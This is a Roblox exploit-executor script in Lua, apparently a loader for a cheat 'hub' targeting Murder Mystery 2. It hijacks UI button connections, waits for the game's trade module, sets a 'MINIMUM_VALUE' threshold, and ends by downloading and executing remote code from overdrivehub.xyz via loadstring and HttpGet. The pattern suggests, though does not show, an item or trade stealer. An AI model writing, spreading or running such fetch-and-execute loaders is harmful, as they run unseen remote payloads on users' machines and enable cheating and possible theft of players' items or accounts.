MINIMUM_VALUE = 5000

if getgenv().ImmortalHub then
    return
end

getgenv().ImmortalHub = true

if not game:IsLoaded() then
    game.Loaded:Wait()
end
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
Player:WaitForChild("PlayerGui", 600)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")
local LocalPlayer = Players.LocalPlayer
local CoinCollected = ReplicatedStorage.Remotes.Gameplay.CoinCollected
local RoundStart = ReplicatedStorage.Remotes.Gameplay.RoundStart

local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
function TapUI(button, check, button2)
    if check == "Active Check" then
        if button.Active then
            button = button[button2]
        else
            return
        end
    end
    if check == "Text Check" then
        if button == "^" then
            button = button2
        else
            return
        end
    end
    for i,v in pairs(events) do
        for i,v in pairs(getconnections(button[v])) do
            v.Function()
        end
    end
end

repeat
    task.wait(1)
    pcall(function()
        TapUI(LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
    end)
    pcall(function()
        TapUI(game:GetService("Players").LocalPlayer.PlayerGui.Join.Friends.Play)
    end)
until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")

repeat
    fr = pcall(function()
        require(game:GetService("ReplicatedStorage").Modules.TradeModule)
    end)
    task.wait()
until fr

loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()
